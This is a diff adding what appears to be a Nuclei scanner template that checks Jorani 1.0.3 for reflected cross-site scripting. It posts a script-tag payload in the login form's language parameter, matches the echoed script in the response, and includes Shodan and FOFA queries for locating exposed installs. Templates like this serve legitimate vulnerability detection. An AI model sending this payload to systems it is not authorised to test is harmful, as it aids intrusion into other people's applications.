@@ -1,0 +1,60 @@
+id: jorani-benjamin-xss
+
+info:
+  name: Jorani v1.0.3-2014-2023 Benjamin BALET - Cross-Site Scripting
+  author: ritikchaddha
+  severity: medium
+  description: |
+    The value of the `language request` parameter is copied into a JavaScript string which is encapsulated in double quotation marks. The payload 75943";alert(1)//569 was submitted in the language parameter. This input was echoed unmodified in the application's response. The attacker can modify the token session and he can discover sensitive information for the server.
+  reference:
+    - https://packetstormsecurity.com/files/174341/Jorani-1.0.3-Cross-Site-Scripting.html
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.favicon.hash:-2032163853
+    product: jorani
+    vendor: jorani
+    fofa-query: icon_hash=-2032163853
+  tags: packetstorm,jorani,benjamin,xss
+
+http:
+  - raw:
+      - |
+        GET /session/login HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /session/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        csrf_test_jorani={{csrf}}&last_page=session%2Flogin&language=en-GBarh5l%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ennois&login={{randstr}}&CipheredValue=
+
+    host-redirects: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.domain)</script>"
+          - "_jorani"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: csrf
+        part: body
+        group: 1
+        regex:
+          - 'name="csrf_test_jorani" value="([0-9a-z]+)"'
+        internal: true
+# digest: 4a0a00473045022100c2670d259bf6aac9c305cb698aab4ba5fa462537727b1e6d9a7c2781795e8eeb02205a837a3cbabe22aa0e72fb03e7449e96c09d635a677ae88efff0646fffdb69a2:922c64590222798bb761d5b6d8e72950
